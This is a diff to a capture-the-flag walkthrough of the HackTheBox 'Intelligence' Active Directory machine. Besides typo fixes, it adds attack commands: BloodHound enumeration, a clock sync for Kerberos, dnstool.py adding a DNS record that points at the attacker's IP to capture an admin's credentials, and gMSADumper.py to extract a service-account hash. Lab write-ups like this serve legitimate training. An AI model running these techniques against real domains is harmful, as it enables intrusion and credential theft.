@@ -209,7 +209,7 @@ Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Grave
 }
 ```
 
-So that script is looking DNS to find webserver names and then trying to connect using default credentials. If it's successful nothing happens, if it fails it emails Ted Graves that the site is down. This makes me believe Ted is potentially an admin of some sort.
+So that script is looking at DNS to find webserver names and then trying to connect using default credentials. If it's successful nothing happens, if it fails it emails Ted Graves that the site is down. This makes me believe Ted is potentially an admin of some sort.
 
 Looking at the Users share gives us access to the c:\users directory and I recursively download all files, but nothing too interesting other than the user.txt flag, which I'll wait to grab when we get an initial foothold.
 
@@ -217,13 +217,19 @@ Looking at the Users share gives us access to the c:\users directory and I recur
 
 ## Bloodhound
 
-I try and grab data with bloodhound-python which works, but does come up with an error saying the clock skew is too great.
+I try and grab data with bloodhound-python which works, but it does come up with an error saying the clock skew is too great.
+
+`bloodhound-python -d intelligence.htb -u 'Tiffany.Molina' -p'<REDACTED>' -ns 10.129.95.154 -c all --zip --dns-tcp`
 
 ![](images2/intelligence9.png)
 
 The clock skew matters with Kerberos so I'm going to fix that and run this again just in case. You can do that with the ntpdate command, which isn't on Kali by default so you may need to install it.
 
+`sudo ntpdate 10.129.95.154`
+
 ![](images2/intelligence10.png)
+
+`bloodhound-python -d intelligence.htb -u 'Tiffany.Molina' -p'<REDACTED>' -ns 10.129.95.154 -c all --zip --dns-tcp`
 
 Now that I've synced my time with the target box I run bloodhound-python again and this time it doesn't have any errors.
 
@@ -257,7 +263,7 @@ We saw the script was reaching out to anything in the DNS starting with web, so 
 
 The dstool.py isn't installed on Kali by default but you can [**find a copy here**.](https://github.com/dirkjanm/krbrelayx/tree/master)
 
-I couldn't it working with Kali, so I tried on a fresh Parrot install and it worked with no issues. I also had to install pycryptodome along with this since that's a dependency.
+I couldn't get it working with Kali, so I tried on a fresh Parrot install and it worked with no issues. I also had to install pycryptodome along with this since that's a dependency.
 
 `python3 dnstool.py -u 'intelligence\Tiffany.Molina' -p <REDACTED> -r webnew.intelligence.htb -a add -t A -d 10.10.14.51 10.129.95.154`
 
@@ -283,13 +289,15 @@ Using hashcat I quickly crack the hash.
 
 We saw earlier with Bloodhound that Ted had the ability to read the GMSA password since he was a member of the IT group. GMSA is the Group Managed Service Account and you can [**read more about it on the official BloodHound site here**.](https://support.bloodhoundenterprise.io/hc/en-us/articles/17322425699355-ReadGMSAPassword)
 
-In that article it links you to a tool called gMSADumper.py on [**this github**.](https://github.com/micahvandeusen/gMSADumper) so I git clone it over to my system and run it.
+In that article it links you to a tool called gMSADumper.py on [**this github**](https://github.com/micahvandeusen/gMSADumper) so I git clone it over to my system and run it.
+
+`git clone https://github.com/micahvandeusen/gMSADumper.git`
 
  `python3 gMSADumper.py -u 'Ted.Graves' -p <REDACTED> -d intelligence.htb`
  
 ![](images2/intelligence16.png)
 
-We get the hash back! Trying to crack it doesn't work, nor does trying it on crackstation or ntlm to password though.
+We get the hash back! Trying to crack it doesn't work, nor does trying it on crackstation or ntlm to password.
 
 <br>
 
